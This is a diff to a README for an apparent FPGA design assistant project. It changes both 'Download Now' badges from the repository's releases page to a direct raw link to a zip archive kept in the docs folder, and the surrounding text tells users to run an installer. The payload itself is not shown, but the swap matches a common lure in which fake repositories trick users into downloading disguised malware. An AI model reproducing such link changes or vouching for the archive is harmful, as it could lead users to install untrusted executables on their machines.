@@ -1,6 +1,6 @@
 # ⚡ codex-fpga-engineering-workflow - Your FPGA Design Assistant
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://github.com/dukemfalme98/codex-fpga-engineering-workflow/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/dukemfalme98/codex-fpga-engineering-workflow/main/docs/fpga_engineering_workflow_codex_3.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Every recommendation comes with proof and documentation, so you know exactly why
 
 Visit this link to download the application:
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-0078d4?style=for-the-badge&logo=windows)](https://github.com/dukemfalme98/codex-fpga-engineering-workflow/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-0078d4?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/dukemfalme98/codex-fpga-engineering-workflow/main/docs/fpga_engineering_workflow_codex_3.9.zip)
 
 ### Step 2: Run the Installer
 
